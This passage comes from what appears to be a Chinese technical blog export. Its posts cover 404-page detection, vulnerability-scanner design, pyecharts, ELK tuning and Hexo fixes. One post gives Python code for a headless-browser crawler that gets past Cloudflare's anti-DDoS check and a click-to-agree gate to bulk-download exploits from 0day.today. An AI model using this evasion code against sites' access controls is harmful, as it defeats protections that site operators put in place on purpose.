网站404页面内容 相似： return this_is_404_pageelse: return this_is_not_404_page 但要通过以上的逻辑判断，需要解决两个问题。问题一：如何提前收集网站的404页面内容；问题二：如何判断目标网页内容与网站404页面内容是否相似。 先解决下问题一，这个比较好解决，我们可以构造一些不存在的路径（比如:/this_is_a_404_nmask_page），请求获取页面内容。 第二个问题比较麻烦，首先我们需要注意这里指的是网页相似而非相同。为何这里不直接判断是否相同呢？因为一些404页面内容包含随机因子，比如当前时间，或者页面包含一些推广的信息，导致每个404页面内容都有差异。因此如何判断目标网页内容与网站404页面内容是否相似，而非相同，才是识别一个网页是否为404页面的科学方法。 那么该如何判断2个网页是否相似呢？这里借鉴了判断文章相似性的算法—余弦相似性算法。那么什么叫余弦相似性算法，它又怎么用于判断网页相似性呢？请往下看。 余弦相似性算法介绍假设我们有需求：判断两篇文章是否相似？实现方案：（1）使用TF-IDF算法，找出两篇文章的关键词；（2）每篇文章各取出若干个关键词（比如20个），合并成一个集合，计算每篇文章对于这个集合中的词的词频（为了避免文章长度的差异，可以使用相对词频）；（3）生成两篇文章各自的词频向量；（4）计算两个向量的余弦相似度，值越大就表示越相似。 具体例子：句子A：我/喜欢/看/电视，不/喜欢/看/电影。句子B：我/不/喜欢/看/电视，也/不/喜欢/看/电影。 得出所有分词为：我，喜欢，看，电视，电影，不，也。 计算词频：（出现的次数）句子A：我 1，喜欢 2，看 2，电视 1，电影 1，不 1，也 0。句子B：我 1，喜欢 2，看 2，电视 1，电影 1，不 2，也 1。 计算词频向量：句子A：[1, 2, 2, 1, 1, 1, 0]句子B：[1, 2, 2, 1, 1, 2, 1] 我们可以把它们想象成空间中的两条线段,我们可以通过夹角的大小，来判断向量的相似程度。夹角越小，就代表越相似。 计算公式： 计算结果： 说明：余弦值越接近1，就表明夹角越接近0度，也就是两个向量越相似，这就叫”余弦相似性”。 基于余弦相似性算法的网页相似性判断方法下面列举了余弦相似性算法与汉明距离算法，测试发现对于判断网页相似性余弦相似性算法准确率更高一些。 123456789101112131415161718192021222324252627282930313233343536373839一）网页标签相似性（筛选出网页所有标签，只选标签名称） 先计算出两个网页所有标签的向量： A：(a,b,c,d,e,f,g,a,b,c) B：(a,c,b,d,e,f,g,a,c) 1）计算A与B的汉明距离： a,b,c,d,e,f,g,a,b,c a,c,b,d,e,f,g,a,c —————————————————— 0 1 1 0 0 0 0 0 1 1 A与B的汉明距离为 1+1+1+1=4，相似度为：(10-4)/10=60% 2）计算A与B的余弦相似性： A: a 2 b 2 c 2 d 1 e 1 f 1 g 1 B: a 2 b 1 c 2 d 1 e 1 f 1 g 1 继续简化： A: [2,2,2,1,1,1,1] B: [2,1,2,1,1,1,1] 余弦相似性： 22+21+22+11+11+11+11 —————————————————————————— ((2^2+2^2+2^2+1^2+1^2+1^2+1^2) ** 0.5) ((2^2+1^2+2^2+1^2+1^2+1^2+1^2) 0.5) 14 = ————- 4 * (130.5) = 0.97 即相似性为97%二）网页文本相似性计算与标签判断算法一样，只是需要筛选出网页文本，并进行分词 说明：汉明距离更注重顺序相似，比如一个网页的标签排序顺序是否相似；而余弦相似性更关注整体标签的个数关系，对顺序不敏感。汉明距离可以看成是点与点间的距离，余弦相似性可以看成是线与线之间的夹角或者说距离。 更加严谨的科学判断 通过余弦相似性算法，我们大致可以计算出两个网页的相似度。那么看似以上逻辑判断应该就可以判断出404页面了。然而实际情况还要更复杂些，比如如何设置相似度的阀值，还需要大量的打标数据去计算。再比如如何降低一些特殊url带来的误报。这里特殊的url包含网站首页、登陆页面等，因为当访问一些404页面时，可能会跳转到此页面上，导致网页相似性计算结果很接近。这些问题的解决方案这里就不介绍了。 判断404页面的测试接口基于以上理论，我自己部署了一个判断404页面的api接口，可供大家测试一下准确性。api接口地址：http://api.nmask.cn/not_exist_page_calculation/?target_url=http://www.baidu.com/nmask若遇到判断错误的url，可在下方留言，或者邮件：tzc@maskghost.com。","categories":[],"tags":[{"name":"技术研究","slug":"技术研究","permalink":"http://chucz.club/tags/技术研究/"},{"name":"余弦相似性","slug":"余弦相似性","permalink":"http://chucz.club/tags/余弦相似性/"}]},{"title":"漫谈漏洞扫描器的设计与开发","slug":"漫谈漏洞扫描器的设计与开发","date":"2018-04-12T00:09:39.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/04/12/漫谈漏洞扫描器的设计与开发/","link":"","permalink":"http://chucz.club/2018/04/12/漫谈漏洞扫描器的设计与开发/","excerpt":"","text":"世界の果てまで、君と離れたくない。 前几天在TSRC换了本《白帽子讲WEB扫描》，昨天凑空拜读了一遍。整体读下来的感觉是，书中关于WEB漏洞扫描器设计与开发所需的知识描述得比较全面，包括一些坑点也有涉及。但对于每一方面的内容描述得不够深入不够细致，适合从0开始学习设计开发漏洞扫描器的工程师，给其提供一些设计思路，避免一些不必要的坑点。当然设计开发扫描器本身就是一个很复杂的工程，作者也不可能在一本书中详细描述，再者有些坑还得自己踩过才知道。 本篇文章作为《白帽子讲WEB扫描》一书读后感，或者说读后总结，也算是本人对漏洞扫描器设计与开发的一次总结。在正式开始总结之前，先感谢下本书作者：刘漩，本文很多内容均借鉴此书，若有转载本文，请务必说明出处。 本文涉及到的知识点比较多，我先列个大致介绍目录，请容我慢慢补充完善.....因为篇幅有限，有些内容本文也只做简单介绍（比如爬虫开发），后面我会对每块内容单独成文详细介绍。 省略一些前言后语 关于为何要开发一款漏洞扫描器，以及不同扫描器（白、黑、灰）的区别、其作用、有何优缺点等问题，此处省略一万字…… 本文概要 本文主要介绍以下两种扫描器的设计与开发：1）基于URL的WEB漏洞扫描器、2）基于指纹的漏洞扫描器。目前市面上很多商业扫描器是包含这两种扫描功能的，但为了能更清楚的知道其原理，我觉得有必要分别介绍。有必要说明一下的是，本文介绍的扫描器均是主动型扫描器，即会主动发起http请求的。至于被动型扫描器，其主要利用http代理（burpsuite）或者流量镜像（绿盟某扫描器）的方式进行扫描，即不会主动发起请求，只是获取请求的内容进行分析。 如何设计基于URL的WEB漏洞扫描器 从本节标题至少可以读出两点信息：第一漏洞扫描器的输入源是URL，第二漏洞扫描主要针对WEB。开发这样一款扫描器至少需要解决以下两个问题： 如何采集输入源（即采集网站URL） * 基于流量清洗 基于日志提取 基于爬虫爬取 如何调用扫描插件（即对URL进行扫描） 从流量中获取URL数据 一般在甲方开发扫描器会涉及到此块内容，因为基于流量获取url是对业务影响最小，且覆盖面最全的一个方案。而一般乙方开发的商业扫描器很多没有涉及到流量清洗，因为部署等难点。 流量收集获取 可以从企业入口主交换机上镜像一份流量到某台服务器上，再通过一些工具从服务器网卡上获取流量，清洗后提取url、post_body、response等数据。获取流量的工具有很多，比如justniffer，suricata等。 流量中获取扫描源有何坑点 一般流量中是没有https数据的，因为无法解密；流量中包含用户认证信息，如何优雅地处理，使之对用法没有影响。 从日志中获取请求数据 一般在甲方开发扫描器会涉及到此块内容，因为基于日志获取url也是对业务影响很小，且覆盖面比较全的一个方案。 日志收集获取怎么在服务器上配置nginx收集日志就不说了，如果对于nginx不熟悉，可移步学习：nginx负载均衡 日志中获取扫描源有何坑点 一般不包含post_body，以及response数据，因为每天产生的日志量非常庞大，如果需要存储这么多数据的话，成本很高，所以一般在服务器上只记录url、时间戳等简单信息。 设计开发一款爬虫 区别于一般的网络爬虫，漏洞扫描涉及到的爬虫是针对同一个站点爬取所有URL的爬虫。想要开发一款好用的爬虫，前提是必须对HTTP协议熟悉。本文不展开介绍http协议，只总结开发爬虫过程中一些注意的点。如果对爬虫不甚了解，可以移步学习：Python爬虫基础（不好意思，还没写….）基于Python的漏洞扫描爬虫（不好意思，也还没写….） HEAD替代GET省资源 注意不是所有请求都用HEAD，而是一部分不需要响应主体的请求可以用HEAD代替GET。head请求唯一区别与get请求的是其不会返回响应主体，只有响应头。 有Cookie闯新大陆 有些网站有最基础的反爬策略（检测请求头），或者有些页面需要登录凭证（cookie认证），因此在爬虫中也需要在请求头中加上cookie。 DNS缓存来提速 当我们每次请求一个域名时，都会先向dns服务器获取域名对应的ip地址，而这个解析记录一般情况下是不太会变的，因此可以一开始爬取的时候解析一次，然后缓存到系统内，后面的请求直接从系统中获取，可以节省资源。 页面获取新URL涉及获取不同标签内的url，以及处理动态链接、静态链接，同源策略，重复url去除等。 处理页面跳转 页面跳转主要分为服务端跳转、客户端跳转，具体介绍可移步:【黑帽seo系列】页面跳转 。客户端跳转对用户是可见的，即在第一次请求时，响应码为301或者302，在响应头的Location中返回了跳转的地址，第二次请求跳转的地址，再返回结果；而服务端请求对用户不可见，即只有一次请求，跳转是在服务端处理的。 处理识别404页面 一般网页不存在，响应码便是404。但有些网站为了对用户友好，当访问不存在的页面是会跳转到一个存在的页面（响应码302、301），或者页面直接显示主页内容（响应码200），或者显示404提示页面（响应码200）。针对这些复杂的情况，仅仅对响应码进行判断显然是不够的，需要结合响应码跟页面内容。 解决方案：先访问一些不存在的页面，获取页面内容，标为C1；再访问目标页面，若响应码为404则表示页面不存在，若不为404，则比较页面源码C2与C1的相似性，若相似也表示不存在。关于如何判断一个页面为404页面的详细内容，请移步：https://thief.one/2018/04/12/1/ 处理重复URL 去除重复的URL，以免重复抓取相同的页面，当然对于一些相似的URL也需要处理。处理方案可以是将url hash以后存入内存中，比如python的list对象中，然后判断新的url的hash在不在此list中，不存在则将url放入队列进行爬取。 计算页面相似性具体可使用汉明距离计算，这对识别404页面有很大的帮助。 请求断开重试有些时候由于网络延迟，会导致请求断开，这时候就需要重试，直到次数达到重试次数阀值。 解析页面表单 如果单纯只是抓取页面中的URL，会少了很多请求，比如点击事件、表单发送等。获取表单信息比较简单，只要匹配页面中的form标签，以及其内部的input标签。当需要爬虫能够自动填充这些字段内容，比如电话字段，需要填充正确的电话号码，因为大部分网站会在前后端对数据格式进行校验。这就需要维护一个表单字段库，对于每个常见的字段都设置了常用值。 解析事件以及ajax请求 目前很多网页通过ajax发送请求，因此也要求我们的爬虫能够解析ajax请求。包括一些页面上的事件，也需要爬虫去触发。 Web2.0爬虫 web2.0与web1.0最大的区别，就是增加了很多动态的内容，很多页面内容是js动态生成的。因此这便要求我们的爬虫有解析js的能力。这里推荐几个模块，phantomjs、chromeheadless等。 维护漏洞库 简单来说，漏洞扫描器主要分为输入与扫描两大块功能，光有输入源还不行，必须得有扫描能力，而扫描能力主要依靠扫描插件的堆积。 如何优雅地对url进行重放请求 从流量中可以获取到一些url，以及post的数据信息（其中包含了认证），由于我们设计的是主动型扫描器，需要主动发起请求，因此如何去优雅地重放这些请求变成了一个难题。由于有些网站cookie过期时间很长，重放请求势必会造成对业务的影响，而不使用cookie，则很多页面无法访问到。 一种解决方案可以是对cookie进行替换，换成测试账户的cookie，这样就对用户没有影响了，但是其中的坑也很多。 如何设计基于指纹的漏洞扫描器 从本节标题也至少可以看出两个信息：第一漏洞扫描器的输入源是服务指纹，第二漏洞扫描针对WEB+服务。开发这样一款扫描器至少需要以下两个步骤： 采集输入源（即采集系统指纹） * 端口扫描 指纹扫描 指纹匹配 调用扫描插件（即匹配指纹进行漏洞扫描） 开发端口扫描器 可以使用python的socket模块开发tcp扫描，或者用nmap、masscan、zmap等开源工具进行扫描。 开发指纹扫描器 可以使用nmap扫描，因为nmap内含了很多指纹探针，可以识别出大部分服务指纹信息。针对web指纹，则需要先发起http请求，获取响应内容，再借助web指纹库识别，或者借助开源的指纹扫描器，比如Whatweb等。 维护指纹库 只有指纹没有指纹库也是不行的，指纹好比是一些身份信息，而我们最终是要定位到某个人，因此还需要有一个指纹库，将指纹信息与人对应起来。 输入源-&gt;队列-&gt;任务分发-&gt;扫描节点-&gt;存储 如何设计 以上简单介绍了设计开发两种扫描器所需要解决的问题，而站在整体角度看，需要解决的问题还远远不够。比如当需要扫描的系统非常庞大时，如何进行分布式的部署，这就要求我们的扫描框架满足分布式部署的需求。 推荐技术栈：python+rabbitmq+celery+mysql 你以为只有这样就结束了？不不不，今天有点累了，过几天再继续补充，比如添加一些基础的代码以及再补充一些更细的内容。还有，网上有很多资料，我还得先整理学习一波。","categories":[],"tags":[{"name":"编程之道","slug":"编程之道","permalink":"http://chucz.club/tags/编程之道/"},{"name":"漏洞扫描器","slug":"漏洞扫描器","permalink":"http://chucz.club/tags/漏洞扫描器/"}]},{"title":"Pyecharts 可视化初探","slug":"Pyecharts-可视化初探","date":"2018-04-09T03:31:39.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/04/09/Pyecharts-可视化初探/","link":"","permalink":"http://chucz.club/2018/04/09/Pyecharts-可视化初探/","excerpt":"","text":"纸短情长啊，诉不完当时年少，我的故事还是关于你呀 最近在开发web应用过程中，需要用到可视化展示功能，因此找了找Python相关的可视化模块。这里简单记录下pyecharts模块的用法。推荐它主要是因为其功能强大，可视化功能选择比较多，且使用比较简单。 pyecharts介绍 首先需要了解下pyecharts模块的运行机制，pyecharts是echarts的python-api，而echarts是百度开源的可视化框架。echarts是用来操作js文件的，因此pyecharts的出现其实是为了能够让python语言更好的对接echarts。简单来说，pyecharts会帮我们生成js文件。 安装pyecharts1pip install pyecharts 或者Github下载源码安装：https://github.com/pyecharts/pyecharts 1234$ git clone https://github.com/pyecharts/pyecharts.git$ cd pyecharts$ pip install -r requirements.txt$ python setup.py install 简单使用pyecharts创建一个test.py文件，写入： 123456789from pyecharts import Bar # 柱状图attr = [“Jan”, “Feb”, “Mar”, “Apr”, “May”, “Jun”, “Jul”, “Aug”, “Sep”, “Oct”, “Nov”, “Dec”]v1 = [2.0, 4.9, 7.0, 23.2, 25.6, 76.7, 135.6, 162.2, 32.6, 20.0, 6.4, 3.3]v2 = [2.6, 5.9, 9.0, 26.4, 28.7, 70.7, 175.6, 182.2, 48.7, 18.8, 6.0, 2.3]bar = Bar(“Bar chart”, “precipitation and evaporation one year”)bar.add(“precipitation”, attr, v1, mark_line=[“average”], mark_point=[“max”, “min”])bar.add(“evaporation”, attr, v2, mark_line=[“average”], mark_point=[“max”, “min”])bar.render() # 生成一个html文件 运行test.py，会在当前目录下生成一个render.html文件，即包含柱状图的网页。查看此html文件，会发现其生成了很多js代码。 说明：除了柱状图外，pyecharts还支持其他可视化展示，具体可参考官方文档：http://pyecharts.org/#/zh-cn/charts pyecharts+Django 前面介绍的是利用pyecharts生成一个存在可视化图表的html页面，那么怎么在Django或者Flask等Web框架中使用呢？即如何在视图层生成图表代码，传递到模版层渲染展示？这里只介绍如何在Django中使用pyecharts，其他web框架同理，可自行研究。 view视图层在Django项目的view.py文件内写入: 12345678910111213141516171819202122from django.http import HttpResponsefrom pyecharts import PieREMOTE_HOST = “https://pyecharts.github.io/assets/js&quot;def Pie_(): # 生成饼图 attr = [“衬衫”, “羊毛衫”, “雪纺衫”, “裤子”, “高跟鞋”, “袜子”] v1 = [11, 12, 13, 10, 10, 10] pie = Pie(“饼图示例”) pie.add(“”, attr, v1, is_label_show=True) return piedef index(request): # 可视化展示页面 pie = Pie_() myechart=pie.render_embed() # 饼图 host=REMOTE_HOST # js文件源地址 script_list=pie.get_js_dependencies() # 获取依赖的js文件名称（只获取当前视图需要的js） return render(request,“index.html”,&#123;“myechart”:myechart,“host”:host,“script_list”:script_list&#125;) 说明：REMOTE_HOST可更换成本地地址，即先前往https://github.com/pyecharts/assets clone项目，再将项目中的js目录copy到Django项目的static/js目录下，然后更改代码中的REMOTE_HOST为： 123REMOTE_HOST = “https://pyecharts.github.io/assets/js&quot;改为：REMOTE_HOST = “../../static/js/js” Django路由在Django项目的urls.py文件内容写入： 1url(r‘^$’,views.index, name=“index”), 模版层在Django项目的templates目录下创建index.html文件，写入： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=“utf-8”&gt; &lt;title&gt;Proudly presented by PycCharts&lt;/title&gt; &#123;% for jsfile_name in script_list %&#125; &lt;script src=“&#123;&#123; host &#125;&#125;/&#123;&#123; jsfile_name &#125;&#125;.js”&gt;&lt;/script&gt; # 加载js文件 &#123;% endfor %&#125;&lt;/head&gt;&lt;body&gt; &#123;&#123; myechart|safe &#125;&#125; # 显示可视化图表，注意要加safe，表示解析视图层传入的html内容&lt;/body&gt;&lt;/html&gt; 运行django1python manage.py runserver 打开浏览器：http://127.0.0.1:8000 参考资料官方文档：http://pyecharts.org/#/zh-cn/Github项目地址：https://github.com/pyecharts/pyecharts","categories":[],"tags":[{"name":"编程之道","slug":"编程之道","permalink":"http://chucz.club/tags/编程之道/"},{"name":"Pyecharts","slug":"Pyecharts","permalink":"http://chucz.club/tags/Pyecharts/"}]},{"title":"ELK的一次吞吐量优化","slug":"ELK的一次吞吐量优化","date":"2018-04-02T19:48:32.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/04/02/ELK的一次吞吐量优化/","link":"","permalink":"http://chucz.club/2018/04/02/ELK的一次吞吐量优化/","excerpt":"","text":"问题一 ● 最近发现kibana的日志传的很慢，常常查不到日志，由于所有的日志收集都只传输到了一个logstash进行收集和过滤，于是怀疑是否是由于logstash的吞吐量存在瓶颈。一看，还真是到了瓶颈。 ● 优化过程 ● 经过查询logstash完整配置文件，有几个参数需要调整 12345678# pipeline线程数，官方建议是等于CPU内核数pipeline.workers: 24# 实际output时的线程数pipeline.output.workers: 24# 每次发送的事件数pipeline.batch.size: 3000# 发送延时pipeline.batch.delay: 5 PS:由于我们的ES集群数据量较大（&gt;28T），所以具体配置数值视自身生产环境 问题二 ● 在查看logstash日志过程中，我们看到了大量的以下报错 12[2017-03-18T09:46:21,043][INFO ][logstash.outputs.elasticsearch] retrying failed action with response code: 429 (&#123;”type”=&gt;”esrejectedexecution_exception”, “reason”=&gt;”rejected execution of org.elasticsearch.transport.TransportService$6@6918cf2e on EsThreadPoolExecutor[bulk, queue capacity = 50, org.elasticsearch.common.util.concurrent.EsThreadPoolExecutor@55337655[Running, pool size = 24, active threads = 24, queued tasks = 50, completed tasks = 1767887463]]”&#125;)[2017-03-18T09:46:21,043][ERROR][logstash.outputs.elasticsearch] Retrying individual actions ● 查询官网，确认为时ES的写入遇到了瓶颈 ● Make sure to watch for TOO_MANY_REQUESTS (429) response codes (EsRejectedExecutionException with the Java client), which is the way that Elasticsearch tells you that it cannot keep up with the current indexing rate. When it happens, you should pause indexing a bit before trying again, ideally with randomized exponential backoff. 我们首先想到的是来调整ES的线程数，但是官网写到”Don’t Touch There Settings!”, 那怎么办？于是乎官方建议我们修改logstash的参数pipeline.batch.size ● 在ES5.0以后，es将bulk、flush、get、index、search等线程池完全分离，自身的写入不会影响其他功能的性能。来查询一下ES当前的线程情况： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849GET _nodes/stats/thread_pool?pretty可以看到：&#123; “_nodes”: &#123; “total”: 6, “successful”: 6, “failed”: 0 &#125;, “cluster_name”: “dev-elasticstack5.0”, “nodes”: &#123; “nnfCv8FrSh-p223gsbJVMA”: &#123; “timestamp”: 1489804973926, “name”: “node-3”, “transport_address”: “192.168.3.:9301”, “host”: “192.168.3.“, “ip”: “192.168.3.***:9301”, “roles”: [ “master”, “data”, “ingest” ], “attributes”: &#123; “rack”: “r1” &#125;, “thread_pool”: &#123; “bulk”: &#123; “threads”: 24, “queue”: 214, “active”: 24, “rejected”: 30804543, “largest”: 24, “completed”: 1047606679 &#125;, …… “watcher”: &#123; “threads”: 0, “queue”: 0, “active”: 0, “rejected”: 0, “largest”: 0, “completed”: 0&#125;&#125;&#125;&#125;&#125; 其中：”bulk”模板的线程数24，当前活跃的线程数24，证明所有的线程是busy的状态，queue队列214，rejected为30804543。那么问题就找到了，所有的线程都在忙，队列堵满后再有进程写入就会被拒绝，而当前拒绝数为30804543。优化方案问题找到了，如何优化呢。官方的建议是提高每次批处理的数量，调节传输间歇时间。当batch.size增大，es处理的事件数就会变少，写入也就愉快了。 123456vim /etc/logstash/logstash.yml#pipeline.workers: 24pipeline.output.workers: 24pipeline.batch.size: 10000pipeline.batch.delay: 10 具体的worker/output.workers数量建议等于CPU数，batch.size/batch.delay根据实际的数据量逐渐增大来测试最优值。","categories":[],"tags":[]},{"title":"记一次爬虫批量爬取exp","slug":"记一次爬虫批量爬取exp","date":"2018-03-26T19:20:08.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/03/26/记一次爬虫批量爬取exp/","link":"","permalink":"http://chucz.club/2018/03/26/记一次爬虫批量爬取exp/","excerpt":"","text":"磨刀不误砍柴工 最近需要收集一些exp，因此逛了逛exploit-db、国内exp搜索大全、seebug等几个exp收集的网站。由于需要批量获取漏洞信息以及对应的exp内容，因此心想有必要写一款爬虫去自动化收集漏洞exp。 选个target 前面三个网站都有丰富的exp资源，但是我并不打算从它们身上去爬取，这里介绍另外一个更牛逼的网站：0day.today（需要翻墙）。选取它的原因是exp更新的更快更丰富，且反爬虫策略做的比较一般。 分析URL结构选好目标后，先尝试分析下网页结构，比如需要判断是动态还是静态页面等特征。此网站算是动态的，其漏洞列表URL结构如下： cn.0day.today/webapps/1（web漏洞列表第一页） cn.0day.today/webapps/2（web漏洞列表第二页） cn.0day.today/remote/1（远程利用漏洞列表第一页） cn.0day.today/local/1（本地利用漏洞列表第一页） …… 每个漏洞列表页面内有30个漏洞列表，每个漏洞列表对应一个漏洞URL，结构如下： cn.0day.today/exploit/30029 cn.0day.today/exploit/30030 说明：此URL内容便是某个漏洞的exp，粗略算一下，web漏洞有600页，每页30个，总数是18000个漏洞exp。 分析网页内容 分析完URL结构，大致可以得出爬虫思路：遍历漏洞列表页数获取全部漏洞URL–&gt;爬取漏洞URL获取漏洞exp。 那么如何通过爬取漏洞列表页面获取漏洞对应的URL，以及如何爬取漏洞信息页面获取exp？，这里需要分析一下页面结构，可以尝试写正则或者摘取网页元素内容的方式获取目标内容。 获取漏洞URL页面结构：对于此页面我没有使用正则，而是使用了BeautifulSoup模块来获取网页元素内容，代码如下： 12345678910soup=BeautifulSoup(content,“html.parser”)n=soup.find_all(“div”,&#123;“class”:“ExploitTableContent”&#125;)if n: for i in n: m=i.find_all(“div”,&#123;“class”:“td allow_tip “&#125;) for j in m: y=j.find_all(“a”) for x in y: vul_name=x.text # 漏洞名称 vul_url=x.attrs.get(“href”) # 漏洞url 获取漏洞EXP页面结构：对于此页面我也没有使用正则，而是使用了BeautifulSoup模块来获取网页元素内容，代码如下： 123456soup=BeautifulSoup(content,“html.parser”)m=soup.find_all(“div”,&#123;“class”:“container”&#125;)n=m[0].find_all(“div”)exp_info=“”for i in n: exp_info+=i.text+“\\n” 反爬虫策略我在连续访问n次网站后，发现此站有一些反爬虫的策略。而我必须研究解决它，才能进一步获取exp内容。 cdn防ddos策略 首先我发现此网站用了cloudflare加速器，且在用户持续访问一段时间后（应该是基于ip+headers认证），会出现防ddos页面。如果此时用普通的爬虫去访问，获取到的页面源码是防ddos的源码，即： 解决方案 当我们打开浏览器访问漏洞页面时，会在防ddos页面上等待几秒后，自动跳转到目标漏洞页面。基于这一特性，我决定使用无头浏览器去访问，设置等待时间即可。这里我选用phantomjs做此试验，其他headless同理。 1234d=webdriver.PhantomJS()d.get(vul_api)time.sleep(5) # 等待5sprint d.page_source # 输出源码 在访问网页5s后，输出的网页源码，便是目标漏洞exp页面的源码。 用户点击确认 在绕过了防ddos策略后，发现网站自身也有一个反爬虫的策略，即需要用户点击确认按钮后，才能继续访问原目标。如果此时用普通的爬虫去访问，获取到的页面源码是用户确认网页的源码，即： 解决方案 此网页需要用户点击“确定”按钮后，会跳转到目标页面，因此可以使用无头浏览器访问，操作页面元素，即模拟点击确定按钮。 12345678d=webdriver.PhantomJS()d.get(vul_api)time.sleep(5) # 等待5s（绕过防ddos策略）d.find_element_by_name(“agree”).click() # 点击确定按钮（绕过用户点击确认策略）time.sleep(5) # 等待5scontent=d.page_source # 输出网页源码d.quit() 总结 想要爬取一个网站的内容，必须要分析此网站的URL结构、网页内容、反爬虫策略等。针对此网站而言，复杂点在于如何绕过反爬虫策略，这里用到了无头浏览器去模拟人访问。总之编写爬虫是需要耐心跟细心的，如何一步步去分析整个访问流程，有时候比如何去编程更重要。也许，这就是所谓的：“磨刀不误砍柴工”吧！","categories":[],"tags":[{"name":"爬虫技术","slug":"爬虫技术","permalink":"http://chucz.club/tags/爬虫技术/"},{"name":"exp","slug":"exp","permalink":"http://chucz.club/tags/exp/"},{"name":"phantomjs爬虫","slug":"phantomjs爬虫","permalink":"http://chucz.club/tags/phantomjs爬虫/"}]},{"title":"hexo使用进阶","slug":"hexo使用进阶","date":"2018-03-18T22:11:01.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/03/18/hexo使用进阶/","link":"","permalink":"http://chucz.club/2018/03/18/hexo使用进阶/","excerpt":"","text":"hexo 一、后端管理插件hexo-admin插件可以直接在网页端创建、编辑markdown文章内容，并将内容发布到_posts里。另外，对我而言，最方便的是可以很方便的给文章加标题、分类、打标签。 参见： An Admin Interface for Hexohexo-admin in github 1.安装 (1)npm install –save hexo-admin (2)hexo server -d (3)open http://localhost:4000/admin/ 2.配置 在_config.yml最后添加类似如下内容： admin: username: myfavoritename password_hash: be121740bf988b2225a313fa1f107ca1 secret: a secret something username：后端登录用户名 password_hash：后端登录用户密码对应的md5 hash值 secret：用于保证cookie安全 3.预览","categories":[],"tags":[]},{"title":"ELK x-pack 详细说明","slug":"ELK-x-pack-详细说明","date":"2018-02-27T23:26:19.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/02/27/ELK-x-pack-详细说明/","link":"","permalink":"http://chucz.club/2018/02/27/ELK-x-pack-详细说明/","excerpt":"","text":"我还能说什么呢？？","categories":[],"tags":[{"name":"ELK","slug":"ELK","permalink":"http://chucz.club/tags/ELK/"},{"name":"x-pack","slug":"x-pack","permalink":"http://chucz.club/tags/x-pack/"}]},{"title":"hexo fs.SyncWriteStream is deprecated","slug":"hexo-fs-SyncWriteStream-is-deprecated","date":"2018-02-27T23:18:16.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/02/27/hexo-fs-SyncWriteStream-is-deprecated/","link":"","permalink":"http://chucz.club/2018/02/27/hexo-fs-SyncWriteStream-is-deprecated/","excerpt":"","text":"fs.SyncWriteStream is deprecated出现这个错误需要更新hexo-fs插件 使用npm install hexo-fs –save 在执行hexo命令的时候，总会显示如下报错：(node:7048) [DEP0061] DeprecationWarning: fs.SyncWriteStream is deprecated. 从报错信息来看是因为fs.SyncWriteStream is deprecated，node.js从8.0开始已经弃用了fs.SyncWriteStream方法，所以是因为我们node_modules中某个插件调用了这个方法，通过查看Hexo作者GitHub对应的项目，在issue中看到有人提到这个问题，在hexo项目中其中有一个hexo-fs的插件调用了这个方法，所以需要更新hexo-fs插件，更新方法如下： npm install hexo-fs –save 更新插件后问题依然无法解决。 通过–debug来查看：[root@server init]# hexo –debug06:55:32.711 DEBUG Hexo version: 3.5.006:55:32.714 DEBUG Working directory: /data/wwwroot/init/06:55:32.787 DEBUG Config loaded: /data/wwwroot/init/_config.yml06:55:32.832 DEBUG Plugin loaded: hexo-admin(node:25414) [DEP0061] DeprecationWarning: fs.SyncWriteStream is deprecated. 问题出在：hexo-admin的hexo-fs因hexo-admin作为后台管理，无法npm uninstall hexo-admin卸载,则找到对应文件，注释： [root@server init]# grep -irn “SyncWriteStream” ./node_modules/hexo-admin/./node_modules/hexo-admin/node_modules/hexo-fs/lib/fs.js:718:exports.SyncWriteStream = fs.SyncWriteStream;[root@lywserver init]# 将对应的exports.SyncWriteStream = fs.SyncWriteStream;注释(前面 //)即可！","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://chucz.club/tags/hexo/"},{"name":"SyncWriteStream","slug":"SyncWriteStream","permalink":"http://chucz.club/tags/SyncWriteStream/"}]},{"title":"记与某牛的一次饭局交流","slug":"记与某牛的一次饭局交流","date":"2018-02-04T19:13:39.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/02/04/记与某牛的一次饭局交流/","link":"","permalink":"http://chucz.club/2018/02/04/记与某牛的一次饭局交流/","excerpt":"","text":"好好学习，天天向上记录与某业界大牛前辈的一次饭局谈话，话后小弟终觉获益匪浅，心想有些关键问题与解惑过程值得一记与分享，因此便有了此文。 偏安全还是开发？ 由于我大学所读的专业偏研发而非安全，本人接触安全的时间也不长，再加上工作中还是以安全开发为主，因此便有了此疑惑。从职业发展（暂不管个人兴趣）来谈，我到底应该选择偏向安全呢？还是开发？ 这个问题一直困扰了我很久，在安全方面我算是刚入门；开发方面熟练python，但开发能力无法跟甲方的RD比。从个人兴趣上来说，我更偏向开发，当然是跟安全相关的开发，比如开发自动化扫描程序等等。但从职业前景上来说，真不知道该如何选择。 某牛结合自身十多年的安全经验给了我一些启迪：“选择偏开发为好，因为安全只是开发中发现的一些bug，只要对开发有深入的了解与实践，那么安全也就自然会懂。”（不一定是原画，但含义一样） 安全杂而广，是选择深入一面，还是面面俱到？ 接上个问题的背景，由于本人的安全能力一般，因此在安全方面还有很多短板，比如说逆向、二进制等，可以说是盲区。因此是否需要学习这些技能，以增加自身安全的能力，还是专注一个方面研究，比如说web安全？ 某牛结合自身十多年的安全经验给了我一些解答：“选择一个方向精通，至于其他方面的技术，等需要的时候再学，如若工作中不需要，则不必要学习，因为长时间不用则会遗忘。”（不一定是原画，但含义一样） 机器学习很火，是否适合安全行业？ 最近几年机器学习可以说是很火热，我也一直想往这方面学习发展，将机器学习应用于安全领域。当然这一块的学习成本比较高，因此我一直还没入门，那么机器学习很火，是否适合安全行业？ 某牛结合自身十多年的安全经验给了我一些建议：“建议不要踏入机器学习的坑，安全不同其他行业，机器学习未必能解决安全问题，比如机器学习能识别哪些是敏感数据吗？学习前的数据打标工作，需要耗费大量的人力，安全防护能力有时靠人力堆规则，而不是机器学习就能解决的。”（不一定是原画，但含义一样） 后记 